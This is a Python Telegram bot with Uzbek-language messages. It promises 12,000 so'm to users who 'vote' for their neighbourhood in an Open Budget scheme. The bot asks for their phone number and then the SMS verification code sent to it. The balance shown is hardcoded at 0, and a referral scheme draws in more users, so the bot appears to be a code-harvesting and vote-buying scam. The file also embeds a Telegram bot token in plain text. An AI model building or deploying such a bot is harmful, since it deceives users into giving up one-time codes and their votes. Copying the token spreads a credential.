import logging
from  aiogram import Bot,Dispatcher,executor,types
from aiogram.types import *
from  btn import start_menu_btn ,mtart_menu_btn
from keybooards import inline

logging.basicConfig(level=logging.INFO)
BOT_TOKEN  = "6227937062:AAFKOeqJqVUH7_tW0yA-TUF5lpZ6eTA3TuE"


bot = Bot(token=BOT_TOKEN,parse_mode="html")
dp = Dispatcher(bot=bot)

@dp.message_handler(commands=["start"]) 
async def start_bot(message:types.Message):
    a = await start_menu_btn()
    await message.answer("""Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.

Unutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.

🚀 Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.
Telefon raqamingizni +998901234567 shaklida yuboring.""",reply_markup=a)
    

@dp.message_handler(text = "🗳 Ovoz berish")
async def ovoz_bot(message:types.Message):

    await message.answer("""
    📞 Ovoz berish uchun telefon raqamingizni kiriting:

Na'muna: +998991234567

✅ Ovoz berish muvaffaqiyatli o'tganda, hisobingizga o'tkazib beriladigan summa: 12000 UZS
    """)

@dp.message_handler(text = "💰 Balans")
async def ovoz_bot(message:types.Message):
    b = await mtart_menu_btn()
    await message.answer("""
💰 Sizning hisobingiz: 0 so'm
📥 Yechib olish uchun minimal summa: 5000 so'm

📌 Pulingizni yechib olish uchun «💳 Yechib olish» tugmasidan foydalaning.
    """,reply_markup= b )

@dp.message_handler(text=["🚫bekor qilish"]) 
async def start_bot(message:types.Message):
    w = await start_menu_btn()
    await message.answer("""Aziz foydalanuvchi siz oʻz ovozingizni berish orqali botdan 12000 so'm paynet sohibi boʼlishiz mumkin.

Unutmang sizning ovozingiz bizning mahallamiz obodonlashtirish uchun juda muhim.

🚀 Botdan pul ishlash uchun telefon raqamingizni kiritishingiz kerak.
Telefon raqamingizni +998901234567 shaklida yuboring.""",reply_markup=w)
    
@dp.message_handler(text=["🔗 Referal ssilka"]) 
async def start_bot(message:types.Message):
    rasm = types.InputFile('rasm.jpg')
    s = await inline()
    await message.answer_photo(photo=rasm,caption="""🔗 Referallaringiz soni: 0 ta
💸 Referal uchun to'lov: 5000 so'm

Sizning referal ssilkangiz👇🏻
https://t.me/OpenBudgetgaOvoz_Bot?start=5370726024""",reply_markup=s)    

@dp.message_handler(text=["📝 Qo'llanma"]) 
async def start_bot(message:types.Message):
    rasm = types.InputFile('open.mp4')
    await message.answer_video(video=rasm,caption="""📌 Botdan foydalanish qo'llanmasi:

1. «🗳 Ovoz berish» knopkasini bosing va nomeringizni yozib qoldiring.

2. Bot sizga matemtik misol beradi shuni javobini botga yuboring misol uchun 2+3= shunaqa misol yuborsa 5 deb javobni o'zini yuborasiz.

3. Nomerizga sms kod keladi shuni botga yozb qoldiring va bot sizga 12000 ming so'm pul beradi.

Pulni nomerizga Paynet qilib yoki plastik raqamizga «💰 Balans» knopkasi orqali pulni yechib olishiz mumkun 🥳""",)    

if  __name__ == "__main__":
    executor.start_polling(dp)
